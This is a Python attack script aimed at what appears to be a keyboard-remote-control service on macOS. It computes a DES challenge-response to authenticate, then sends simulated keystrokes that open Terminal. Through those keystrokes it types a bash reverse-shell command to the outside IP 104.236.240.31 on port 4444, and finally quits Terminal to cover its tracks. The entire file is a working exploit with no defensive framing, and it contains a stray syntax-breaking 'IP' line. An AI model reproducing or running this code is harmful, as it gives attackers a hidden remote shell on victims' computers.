from Crypto.Cipher import DES
import struct
import socket
import re
import time

IP
payload = "bash -i >& /dev/tcp/104.236.240.31/4444 0>&1 & disown"


def handshake(key,chall):

    #http://www.vidarholen.net/contents/junk/vnc.html
    #Truncate to 8 chars
    key = key[:8]
    # Convert to binary
    binary = (' '.join(format(ord(x), 'b') for x in key))
    binaryList = binary.split()
    count=0
    #Add leading zeros
    for x in binaryList:
        binaryList[count] = ("0" * (8 - len(binaryList[count]))) + binaryList[count]
        count+=1
    # Function to mirror the byte
    def bitMirror(byte):
        return byte[::-1]
    flipkey=""
    # turn back into binary
    for x in binaryList:
        flipkey += struct.pack('B', int(bitMirror(x), 2))
    #Pad with NULL bytes
    flipkey += "\x00" * (8 - len(flipkey))
    #Encryptwith DES
    des = DES.new(flipkey, DES.MODE_ECB)
    #Challange from server
    challenge= chall.decode("hex")
    response = des.encrypt(challenge)
    return ''.join(x.encode('hex') for x in response)


def inject_keystrokes(payload, address, port, password):

    BUFFER_SIZE = 1024
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address, port))
    data = s.recv(BUFFER_SIZE)
    #strip out the challange
    look_for = "authentication-challenge"
    splitter = data.split(look_for, 1)[1]
    stripped = re.sub(r'\W+', '', splitter)
    auth_response = str.upper(handshake(password, stripped))
    #return the response
    MESSAGE = '{"id":"handshake","authentication-response":"' + auth_response + '"}'
    s.send(MESSAGE)
    s.send("\x0d\x0a")
    time.sleep(1)
    # Open the terminal
    open_terminal(s)
    #Inject the payload
    i = 0
    while i < len(payload):
        s.send('{"id": "keyCharPress", "key": "' + payload[i] + '", "down": true}')
        s.send("\x0d\x0a")
        time.sleep(.01)
        s.send('{"id": "keyCharPress", "key": "' + payload[i] + '", "down": false}')
        s.send("\x0d\x0a")
        time.sleep(.01)
        i += 1
    #Make sure the terminal window is closed
    close_terminal(s)
    #Close socket
    s.close()


def close_terminal(s):

    s.send('{"id": "keyCodePress", "key": "RETURN", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCodePress", "key": "RETURN", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(.1)
    s.send('{"id": "keyCodePress", "key": "CMD", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(.1)
    s.send('{"id": "keyCodePress", "key": "Q", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(.1)
    s.send('{"id": "keyCodePress", "key": "Q", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(.1)
    s.send('{"id": "keyCodePress", "key": "CMD", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(.1)
    s.send('{"id": "keyCodePress", "key": "RETURN", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCodePress", "key": "RETURN", "down": false}')
    s.send("\x0d\x0a")


def open_terminal(s):

    s.send('{"id": "keyCodePress", "key": "CMD", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCodePress", "key": " ", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCodePress", "key": " ", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCodePress", "key": "CMD", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "t", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "t", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "e", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "e", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "r", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "r", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "m", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "m", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "i", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "i", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "n", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "n", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "a", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "a", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "l", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCharPress", "key": "l", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCodePress", "key": "RETURN", "down": true}')
    s.send("\x0d\x0a")
    time.sleep(.01)
    s.send('{"id": "keyCodePress", "key": "RETURN", "down": false}')
    s.send("\x0d\x0a")
    time.sleep(.10)


inject_keystrokes(payload, "127.0.0.1", 41660, "xxxxx")










